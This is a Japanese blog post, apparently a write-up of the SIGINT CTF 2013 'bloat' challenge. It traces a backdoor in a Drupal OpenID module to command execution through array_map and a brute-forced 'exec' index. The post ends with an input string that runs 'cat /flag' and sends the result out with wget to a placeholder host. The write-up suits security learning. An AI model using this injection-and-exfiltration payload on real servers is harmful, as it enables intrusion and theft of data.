---
title: SIGINT CTF 2013 writeup – bloat (cloud 200)
author: tyage
type: post
date: 2013-07-16T20:23:45+00:00
url: /archive/p689.html
wp-syntax-cache-content:
  - |
    a:4:{i:1;s:590:"
    <div class="wp_syntax" style="position:relative;"><table><tr><td class="line_numbers"><pre>10
    </pre></td><td class="code"><pre class="php" style="font-family:monospace;"><span style="color: #990000;">define</span><span style="color: #009900;">&#40;</span><span style="color: #0000ff;">'OPENID_DH_DEFAULT_GEN'</span><span style="color: #339933;">,</span> <span style="color: #0000ff;">'86'</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span></pre></td></tr></table><p class="theCode" style="display:none;">define('OPENID_DH_DEFAULT_GEN', '86');</p></div>
    ";i:2;s:2414:"
    <div class="wp_syntax" style="position:relative;"><table><tr><td class="line_numbers"><pre>211
    212
    213
    214
    215
    216
    217
    218
    219
    220
    </pre></td><td class="code"><pre class="php" style="font-family:monospace;">      <span style="color: #000088;">$discovery</span> <span style="color: #339933;">=</span> openid_discovery<span style="color: #009900;">&#40;</span><span style="color: #000088;">$imaginably</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
          <span style="color: #b1b100;">if</span><span style="color: #009900;">&#40;</span><span style="color: #990000;">strpos</span><span style="color: #009900;">&#40;</span><span style="color: #000088;">$imaginably</span><span style="color: #339933;">,</span> <span style="color: #0000ff;">'@'</span><span style="color: #009900;">&#41;</span><span style="color: #009900;">&#41;</span>
      <span style="color: #009900;">&#123;</span>
       <span style="color: #990000;">list</span><span style="color: #009900;">&#40;</span><span style="color: #000088;">$user</span><span style="color: #339933;">,</span> <span style="color: #000088;">$host</span><span style="color: #009900;">&#41;</span> <span style="color: #339933;">=</span> <span style="color: #990000;">explode</span><span style="color: #009900;">&#40;</span><span style="color: #0000ff;">'@'</span><span style="color: #339933;">,</span> <span style="color: #000088;">$imaginably</span><span style="color: #339933;">,</span> <span style="color: #cc66cc;">2</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
    <span style="color: #009900;">&#125;</span>
    <span style="color: #b1b100;">else</span>
        <span style="color: #009900;">&#123;</span>
         <span style="color: #000088;">$user</span> <span style="color: #339933;">=</span> <span style="color: #009900; font-weight: bold;">false</span><span style="color: #339933;">;</span>
         <span style="color: #000088;">$host</span> <span style="color: #339933;">=</span> <span style="color: #009900; font-weight: bold;">false</span><span style="color: #339933;">;</span>
         <span style="color: #009900;">&#125;</span></pre></td></tr></table><p class="theCode" style="display:none;">      $discovery = openid_discovery($imaginably);
          if(strpos($imaginably, '@'))
      {
       list($user, $host) = explode('@', $imaginably, 2);
    }
    else
        {
         $user = false;
         $host = false;
         }</p></div>
    ";i:3;s:1329:"
    <div class="wp_syntax" style="position:relative;"><table><tr><td class="line_numbers"><pre>247
    248
    </pre></td><td class="code"><pre class="php" style="font-family:monospace;"><span style="color: #000088;">$user_enc</span> <span style="color: #339933;">=</span> _openid_dh_long_to_base64<span style="color: #009900;">&#40;</span><span style="color: #000088;">$user</span> <span style="color: #339933;">*</span> OPENID_DH_DEFAULT_GEN<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
        <span style="color: #000088;">$service</span><span style="color: #009900;">&#91;</span><span style="color: #0000ff;">'uri'</span><span style="color: #009900;">&#93;</span> <span style="color: #339933;">=</span> drupal_map_assoc<span style="color: #009900;">&#40;</span><span style="color: #990000;">array</span><span style="color: #009900;">&#40;</span><span style="color: #000088;">$host</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">,</span> <span style="color: #000088;">$user_enc</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span></pre></td></tr></table><p class="theCode" style="display:none;">$user_enc = _openid_dh_long_to_base64($user * OPENID_DH_DEFAULT_GEN);
        $service['uri'] = drupal_map_assoc(array($host), $user_enc);</p></div>
    ";i:4;s:2110:"
    <div class="wp_syntax" style="position:relative;"><table><tr><td class="code"><pre class="php" style="font-family:monospace;"><span style="color: #b1b100;">for</span> <span style="color: #009900;">&#40;</span><span style="color: #000088;">$i</span><span style="color: #339933;">=</span><span style="color: #cc66cc;">0</span><span style="color: #339933;">;</span><span style="color: #000088;">$i</span><span style="color: #339933;">&lt;</span><span style="color: #cc66cc;">100000</span><span style="color: #339933;">;++</span><span style="color: #000088;">$i</span><span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
      <span style="color: #000088;">$user_enc</span> <span style="color: #339933;">=</span> _openid_dh_long_to_base64<span style="color: #009900;">&#40;</span><span style="color: #000088;">$i</span> <span style="color: #339933;">*</span> <span style="color: #cc66cc;">86</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
      <span style="color: #b1b100;">if</span> <span style="color: #009900;">&#40;</span><span style="color: #990000;">is_callable</span><span style="color: #009900;">&#40;</span><span style="color: #000088;">$user_enc</span><span style="color: #009900;">&#41;</span><span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
        <span style="color: #990000;">var_dump</span><span style="color: #009900;">&#40;</span><span style="color: #000088;">$user_enc</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
        <span style="color: #990000;">var_dump</span><span style="color: #009900;">&#40;</span><span style="color: #000088;">$i</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
      <span style="color: #009900;">&#125;</span>
    <span style="color: #009900;">&#125;</span></pre></td></tr></table><p class="theCode" style="display:none;">for ($i=0;$i&lt;100000;++$i) {
      $user_enc = _openid_dh_long_to_base64($i * 86);
      if (is_callable($user_enc)) {
        var_dump($user_enc);
        var_dump($i);
      }
    }</p></div>
    ";}
categories:
  - CTF

---
<h3>CTF</h3>
<p>えと、ブログを更新停止している間に、Epsilon DeltaとしていくつかCTFに参加していました。</p>
<ul>
<li>Codegate YUT Preliminary 2013</li>
<li>Nuit du Hack CTF Quals 2013</li>
<li>BaltCTF Quals 2013</li>
<li>SECUINSIDE CTF Quals 2013</li>
<li>Boston Key Party CTF 2013</li>
<li>DEF CON CTF Qualifier 2013</li>
<li>SIGINT CTF 2013</li>
</ul>
<p>はじめは海外のCTFの感覚がつかめず、ちゃんと解いたような記憶もなかったのですが、BKPあたりからは少し慣れてきたような気がします。</p>
<p>今まで解いてた問題のwrite upを書こうとも思ったのですが、すっかり忘れてしまっているため、一番最近やったSIGINT CTFのwrite upを書くことにします。</p>
<p><!--more--></p>
<hr />
<h3>bloat</h3>
<p><a href="https://ctf.sigint.ccc.de/challenges/24/">SIGINT CTF 2013 – bloat (cloud 200)</a></p>
<p>この問題は、PHPで作られたWebアプリケーションにバックドアが仕掛けられているので、それを発見しろという問題です。</p>
<p>ソースコードが配られているのでそれを見てバックドアを探します。</p>
<p>配布されたソースコードはDrupalを使用したものでした。</p>
<p>ということなので、早速diffをとってみるのですが、様々な場所の変数名が変更されており、またインデントや改行もめっちゃくちゃにされていたため、diffをとると何万行ものダミー変更部に悩まされることになり、バックドアの発見は難しくなっていました。</p>
<p>そこで、PHPの構文を解析して圧縮してくれる<a href="https://code.google.com/p/php-compressor/">php-compressor</a>を使用し、ファイルを圧縮した上でdiffをとってみました。<br />
（実際には今回の問題用に圧縮後の変数名の命名方法を変更するなどしています。）</p>
<p>すると、何千行か関係のないdiffもあったのですが、openID関連のファイルにバックドアらしき変更がされているのが見つかりました。</p>

<div class="wp_syntax" style="position:relative;"><table><tr><td class="line_numbers"><pre>10
</pre></td><td class="code"><pre class="php" style="font-family:monospace;"><span style="color: #990000;">define</span><span style="color: #009900;">&#40;</span><span style="color: #0000ff;">'OPENID_DH_DEFAULT_GEN'</span><span style="color: #339933;">,</span> <span style="color: #0000ff;">'86'</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span></pre></td></tr></table></div>


<div class="wp_syntax" style="position:relative;"><table><tr><td class="line_numbers"><pre>211
212
213
214
215
216
217
218
219
220
</pre></td><td class="code"><pre class="php" style="font-family:monospace;">      <span style="color: #000088;">$discovery</span> <span style="color: #339933;">=</span> openid_discovery<span style="color: #009900;">&#40;</span><span style="color: #000088;">$imaginably</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
      <span style="color: #b1b100;">if</span><span style="color: #009900;">&#40;</span><span style="color: #990000;">strpos</span><span style="color: #009900;">&#40;</span><span style="color: #000088;">$imaginably</span><span style="color: #339933;">,</span> <span style="color: #0000ff;">'@'</span><span style="color: #009900;">&#41;</span><span style="color: #009900;">&#41;</span>
  <span style="color: #009900;">&#123;</span>
   <span style="color: #990000;">list</span><span style="color: #009900;">&#40;</span><span style="color: #000088;">$user</span><span style="color: #339933;">,</span> <span style="color: #000088;">$host</span><span style="color: #009900;">&#41;</span> <span style="color: #339933;">=</span> <span style="color: #990000;">explode</span><span style="color: #009900;">&#40;</span><span style="color: #0000ff;">'@'</span><span style="color: #339933;">,</span> <span style="color: #000088;">$imaginably</span><span style="color: #339933;">,</span> <span style="color: #cc66cc;">2</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
<span style="color: #009900;">&#125;</span>
<span style="color: #b1b100;">else</span>
    <span style="color: #009900;">&#123;</span>
     <span style="color: #000088;">$user</span> <span style="color: #339933;">=</span> <span style="color: #009900; font-weight: bold;">false</span><span style="color: #339933;">;</span>
     <span style="color: #000088;">$host</span> <span style="color: #339933;">=</span> <span style="color: #009900; font-weight: bold;">false</span><span style="color: #339933;">;</span>
     <span style="color: #009900;">&#125;</span></pre></td></tr></table></div>


<div class="wp_syntax" style="position:relative;"><table><tr><td class="line_numbers"><pre>247
248
</pre></td><td class="code"><pre class="php" style="font-family:monospace;"><span style="color: #000088;">$user_enc</span> <span style="color: #339933;">=</span> _openid_dh_long_to_base64<span style="color: #009900;">&#40;</span><span style="color: #000088;">$user</span> <span style="color: #339933;">*</span> OPENID_DH_DEFAULT_GEN<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
    <span style="color: #000088;">$service</span><span style="color: #009900;">&#91;</span><span style="color: #0000ff;">'uri'</span><span style="color: #009900;">&#93;</span> <span style="color: #339933;">=</span> drupal_map_assoc<span style="color: #009900;">&#40;</span><span style="color: #990000;">array</span><span style="color: #009900;">&#40;</span><span style="color: #000088;">$host</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">,</span> <span style="color: #000088;">$user_enc</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span></pre></td></tr></table></div>

<p>drupal_map_assocをみてみると、array_mapを使用しているため、$user_encが関数名となればその関数を実行できるようだとわかりました。</p>
<p>そこで、実行できる関数を探すため、以下のscriptを走らせたところ、execとfile関数が実行可能であると判明しました。</p>

<div class="wp_syntax" style="position:relative;"><table><tr><td class="code"><pre class="php" style="font-family:monospace;"><span style="color: #b1b100;">for</span> <span style="color: #009900;">&#40;</span><span style="color: #000088;">$i</span><span style="color: #339933;">=</span><span style="color: #cc66cc;">0</span><span style="color: #339933;">;</span><span style="color: #000088;">$i</span><span style="color: #339933;">&lt;</span><span style="color: #cc66cc;">100000</span><span style="color: #339933;">;++</span><span style="color: #000088;">$i</span><span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
  <span style="color: #000088;">$user_enc</span> <span style="color: #339933;">=</span> _openid_dh_long_to_base64<span style="color: #009900;">&#40;</span><span style="color: #000088;">$i</span> <span style="color: #339933;">*</span> <span style="color: #cc66cc;">86</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
  <span style="color: #b1b100;">if</span> <span style="color: #009900;">&#40;</span><span style="color: #990000;">is_callable</span><span style="color: #009900;">&#40;</span><span style="color: #000088;">$user_enc</span><span style="color: #009900;">&#41;</span><span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
    <span style="color: #990000;">var_dump</span><span style="color: #009900;">&#40;</span><span style="color: #000088;">$user_enc</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
    <span style="color: #990000;">var_dump</span><span style="color: #009900;">&#40;</span><span style="color: #000088;">$i</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
  <span style="color: #009900;">&#125;</span>
<span style="color: #009900;">&#125;</span></pre></td></tr></table></div>

<p> => 結果：</p>
<pre>
string(4) "exec"
int(93802)
string(4) "file"
int(96141)
</pre>
<p>ここまでくれば、あとはexec関数を実行するだけです。</p>
<p>しかし、関数の実行結果はレスポンスで帰ってこないため、wgetを使用して、結果を見れるようにしました。</p>
<p>色々したところ、/flagにflagがあることが判明したので、以下の文字列をopenIDに入力して送信し、flagを獲得しました。</p>
<pre>
93802@cat /flag | awk '{print "http://xxxxx/xxx?key=" $0;}' | xargs wget
</pre>
<h3>オチ</h3>
<p>最終的に解けたのはいいのですが、実はコンテストの開催期間を勘違いしており、問題をちゃんと解き始めた時点でコンテストが終わっていたのでした・・・</p>
<p>結局、ポイント的に今回はチームに貢献することができませんでしたorz</p>
<p>この問題のポイントを獲得したのは1チームだけだったようです。<br />
参考にそのチームの方のwrite upを載せておきます。</p>
<p><a href="https://cesena.ing2.unibo.it/2013/07/07/sigint-2013-cloud200-bloat/">SIGINT 2013 – [cloud200] bloat</a></p>
<p>個人的には最後にncコマンドを使用したところは非常に参考になりました。<br />
なんで思いつかなかったんだろう。。。</p>
